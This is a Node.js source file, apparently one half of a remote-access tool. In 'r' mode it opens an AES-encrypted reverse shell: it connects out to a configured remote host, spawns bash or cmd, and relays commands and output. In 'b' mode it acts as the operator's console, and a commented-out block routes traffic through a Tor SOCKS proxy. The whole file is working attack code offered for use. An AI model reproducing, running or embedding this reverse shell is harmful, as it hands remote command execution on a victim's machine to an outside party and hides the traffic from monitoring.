const { createConnection } = require("net");
const { createInterface } = require("readline")
const { spawn } = require("child_process")
const { b64coder, CryptorAES } = require('./crypt')
const {remote_address, remote_port, aes_password, aes_iv} = require('./client_config.json')

// TOR routing
/* const https = require("https");
const { SocksProxyAgent } = require("socks-proxy-agent");

const agent = new SocksProxyAgent("socks5h://192.168.137.133:9050");

https.get("https://ifconfig.me", {
  agent
}, res => {
  res.pipe(process.stdout);
}); */

const b64 = new b64coder()
const crypt = new CryptorAES(aes_password, aes_iv)

const config = {
    host: remote_address,
    port: remote_port
}

function translate_out(cleartext){
    const encodedData = b64.encode_b64(cleartext.toString())
    const encrypted = crypt.encrypt(encodedData)
    return(encrypted)
}

function translate_in(ciphertext){
    const decrypted = crypt.decrypt(ciphertext.toString())
    const decodedData = b64.decode_b64(decrypted)
    return(decodedData)
}

function Bind (){
    const client = createConnection(config, () => {
        const int = createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: ""
        })
    
        int.on("line", (data) => {
            client.write(translate_out(data))
        })
    
        int.on("SIGINT", () => {
            client.end()
        })
    
        client.on("data", (data) => {
            console.log(translate_in(data))
        });
         
        client.on("connect", (data) => {
             console.log("Connect Success")
        })
         
        client.on("error", (data) => {
            switch(data.code){
                case "ECONNRESET":
                    console.log("Server connection reset.")
                    process.exit(1)
                    break
                default:
                    console.log(data)
                    break
            }
         })
         
        client.on("end", () => { 
            console.log("disconnected from server");
            process.exit(0)
        });
    });
}

function Reverse (){
    const client = createConnection(config, () => {
        let shellcmd = undefined
        switch(process.platform){
            case "linux":
                shellcmd = "bash"
                break
            case "android":
                shellcmd = "bash"
                break
            case "win32":
                shellcmd = "cmd"
                break
        }
    
        const shell = spawn(shellcmd)
    
        // shell stdout to client
        shell.stdout.on("data", (data) => {
            client.write(translate_out(data))
        })
    
        shell.stderr.on("data", (error) => {
            client.write(translate_out(error))
        })
    
        shell.on("exit", () => {
            process.exit(0)
        })
    
        client.on("data", (data) => {
            shell.stdin.write(`${translate_in(data)}\n`)
        })
    
         
        client.on("error", (data) => {
            switch(data.code){
                case "ECONNRESET":
                    process.exit(1)
                default:
                    console.log(data)
                    process.exit(1)
            }
         })
         
        client.on("end", () => { 
            process.exit(0)
        });
    });
}

switch(process.argv[2]){
    case "b":
        Bind()
        break
    case "r":
        Reverse()
        break
    default:
        console.log("Define an operating mode!")
        console.log("usage:")
        console.log("node client r (Reverse connection)")
        console.log("node client b (Bind connection)")
        process.exit(1)
}